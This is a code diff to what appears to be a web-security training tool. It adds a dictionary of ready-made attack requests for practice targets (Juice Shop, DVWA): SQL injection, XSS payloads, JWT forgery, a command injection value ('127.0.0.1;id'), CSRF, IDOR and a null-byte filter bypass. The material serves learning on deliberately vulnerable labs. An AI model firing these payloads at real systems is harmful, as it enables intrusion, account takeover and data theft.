@@ -490,6 +490,25 @@ _MITRE = {
     "exposed_files_harvest": "T1083", "target_intel_harvest": "T1592",
     "excessive_data_exposure": "T1213",
 }
+# "Try it" — a concrete request to fire against a wired practice target (Juice Shop @ :42000 /
+# DVWA @ :42080), so a technique can be learned by DOING it, in-app. Copy-paste, then tweak.
+_TRY = {
+    "sqli_auth_bypass": "POST /rest/user/login  json {\"email\":\"' or 1=1--\",\"password\":\"x\"}  → admin token",
+    "sqli_union_extract": "GET /rest/products/search?q=')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
+    "reflected_xss": "GET /rest/track-order/<iframe src=\"javascript:alert(`xss`)\">",
+    "stored_xss": "POST /api/Products  json {\"description\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\"}",
+    "jwt_forge": "GET /encryptionkeys/jwt.pub  → sign an HS256 token with that key as the HMAC secret → send as Bearer",
+    "excessive_data_exposure": "GET /rest/user/whoami?fields=id,email,password  (cookie: token=<jwt>)  → password hash",
+    "bfla_privileged_action": "PUT /api/Products/9  json {\"description\":\"<a href=\\\"https://owasp.slack.com\\\" target=\\\"_blank\\\">x</a>\"}",
+    "business_logic_abuse": "add a basket item with a NEGATIVE quantity, then POST /rest/basket/{bid}/checkout",
+    "open_redirect": "GET /redirect?to=https://evil.example/?x=https://github.com/juice-shop/juice-shop",
+    "idor_bola_read": "GET /rest/basket/2  with YOUR token (basket 2 isn't yours)",
+    "csrf": "POST /profile  (cookie token, Origin: http://htmledit.squarefree.com, username change)",
+    "weak_secret_forgery": "forge a z85 coupon (MMMYY-99, salt-free) offline → PUT /rest/basket/{bid}/coupon/{code}",
+    "command_injection": "(DVWA :42080) POST /vulnerabilities/exec/  ip=127.0.0.1;id  → look for uid=",
+    "weak_2fa_bypass": "compute the TOTP from the leaked secret (HMAC-SHA1) → POST /rest/2fa/verify",
+    "exposed_files_harvest": "GET /ftp/package.json.bak%2500.md  (poison null byte past the extension filter)",
+}
 _WSTG_BASE = "https://owasp.org/www-project-web-security-testing-guide/stable/"
 for _tid, _rec in TECHNIQUES.items():
     _rec["wstg"] = _WSTG.get(_tid)
@@ -529,6 +548,7 @@ def taxonomy_view(lens: str = "owasp") -> dict:
             "execution": t.get("execution", "auto"),
             # the in-app lesson — learn the method without leaving Apolaki
             "detect": t.get("detect", ""), "exploit": t.get("exploit", ""), "oracle": t.get("oracle", ""),
+            "try_it": _TRY.get(t["id"]),   # concrete request to fire on a wired practice target
         })
     out = [{"key": k, "count": len(v),
             "techniques": sorted(v, key=lambda x: (x["status"] != "proven", x["id"]))}
